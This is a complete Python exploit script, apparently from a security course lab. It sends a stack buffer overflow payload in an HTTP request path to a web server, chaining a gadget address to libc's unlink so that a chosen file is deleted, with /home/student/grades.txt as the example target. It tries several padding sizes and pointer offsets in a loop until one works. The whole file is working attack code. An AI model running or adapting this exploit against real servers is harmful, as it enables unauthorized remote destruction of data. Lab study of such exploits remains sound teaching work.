#!/usr/bin/env python3

import sys
import struct
import socket
import time
import urllib.parse

def create_payload(accidentally_addr, unlink_addr, buf_addr, filename, offset, pad):
    """Create the buffer overflow payload with variable filename pointer offset"""
    filename_addr = buf_addr + pad + offset
    payload = b"A" * pad
    payload += struct.pack("<Q", accidentally_addr)
    payload += struct.pack("<Q", unlink_addr)
    payload += struct.pack("<Q", 0xdeadbeefdeadbeef)  # Dummy return address
    payload += struct.pack("<Q", filename_addr)
    payload += filename.encode() + b"\x00"  # Argument to unlink at the end of payload
    return payload, filename_addr

def exploit(target_host, target_port, accidentally_addr, unlink_addr, buf_addr, filename):
    """Try multiple offsets for the filename pointer and print the result for each."""
    for pad in [120, 128, 136, 144, 152]:
        print(f"\n=== Trying padding: {pad} ===")
        for i in range(0, 8*8+1, 8):
            print(f"\n=== Trying offset: {i} (filename_addr = buf_addr + {pad} + {i}) ===")
            payload, filename_addr = create_payload(accidentally_addr, unlink_addr, buf_addr, filename, i, pad)
            print(f"[*] buf_addr: 0x{buf_addr:x}")
            print(f"[*] filename_addr: 0x{filename_addr:x}")
            print("Payload (hex):", payload.hex())
            print("Payload length:", len(payload))
            # URL-encode the payload to avoid forbidden bytes in the request path
            encoded_payload = urllib.parse.quote_from_bytes(payload)
            req = b"GET /" + encoded_payload.encode() + b" HTTP/1.0\r\n\r\n"
            print(f"[*] Target: {target_host}:{target_port}")
            print(f"[*] File to delete: {filename}")
            print(f"[*] Payload size: {len(payload)} bytes")
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((target_host, target_port))
                print(f"[+] Connected to {target_host}:{target_port}")
                s.send(req)
                print(f"[+] Sent {len(req)} bytes")
                try:
                    response = s.recv(1024)
                    if response:
                        print(f"[+] Response received: {len(response)} bytes")
                        print(f"[+] Response preview: {response[:100]}")
                except socket.timeout:
                    print("[*] No response received (timeout)")
                except Exception as e:
                    print(f"[*] Error receiving response: {e}")
                s.close()
                print("[+] Exploit completed for offset", i)
            except Exception as e:
                print(f"[-] Error during exploit for offset {i}: {e}")

    print("\n[!] Finished trying all offsets. Check the server and file status.")
    return True

def main():
    """Main function with command line argument parsing"""
    if len(sys.argv) < 7:
        print("Usage: python3 exploit-5.py <target_host> <target_port> <accidentally_addr> <unlink_addr> <buf_addr> <filename>")
        print("Example: python3 exploit-5.py 127.0.0.1 8080 0x2b8c 0x7ffff7e9c1c0 0x7fffffffd630 /home/student/grades.txt")
        print("\nDefault values (if not specified):")
        print("  accidentally_addr: 0x2b8c")
        print("  unlink_addr: 0x7ffff7e9c1c0")
        print("  buf_addr: 0x7fffffffd630")
        print("  filename: /home/student/grades.txt")
        sys.exit(1)
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    # Parse addresses (handle hex strings)
    try:
        accidentally_addr = int(sys.argv[3], 16) if sys.argv[3].startswith('0x') else int(sys.argv[3])
        unlink_addr = int(sys.argv[4], 16) if sys.argv[4].startswith('0x') else int(sys.argv[4])
        buf_addr = int(sys.argv[5], 16) if sys.argv[5].startswith('0x') else int(sys.argv[5])
    except ValueError as e:
        print(f"[-] Error parsing addresses: {e}")
        sys.exit(1)
    filename = sys.argv[6]
    print("[*] Starting buffer overflow exploit with multiple offsets...")
    print(f"[*] Accidentally address: 0x{accidentally_addr:x}")
    print(f"[*] Unlink address: 0x{unlink_addr:x}")
    print(f"[*] Buffer address: 0x{buf_addr:x}")
    exploit(target_host, target_port, accidentally_addr, unlink_addr, buf_addr, filename)

if __name__ == "__main__":
    main()
